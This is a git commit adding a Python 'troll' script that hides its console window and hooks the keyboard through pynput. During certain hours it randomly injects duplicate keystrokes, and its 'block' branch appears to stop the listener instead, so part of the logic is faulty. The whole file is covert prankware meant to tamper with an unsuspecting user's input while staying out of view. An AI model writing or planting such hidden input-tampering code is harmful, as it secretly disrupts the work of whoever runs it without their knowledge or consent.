cdbbf41d8c0255732bc9ed2a89debb9e04aee539
Sinnisterly <60723887+Sinnisterly@users.noreply.github.com>
2024-09-07 16:42:35 -0700

    Add files via upload

---
+++ troll chance duplicate keys.py
@@ -0,0 +1,31 @@
+import ctypes
+import random
+from pynput import keyboard
+import datetime
+
+DUPLICATE_PROBABILITY = 0.07
+BLOCK_PROBABILITY = 0.07
+
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+def on_press(key):
+    current_hour = datetime.datetime.now().hour
+    if '1' in str(current_hour) or '4' in str(current_hour):
+        rand_num = random.random()
+        if rand_num < DUPLICATE_PROBABILITY:
+            try:
+                keyboard.Controller().press(key)
+                keyboard.Controller().release(key)
+            except:
+                pass
+        elif rand_num < BLOCK_PROBABILITY + DUPLICATE_PROBABILITY:
+            return False
+    else:
+        return True  # Allow key press to pass through if not in active hours
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
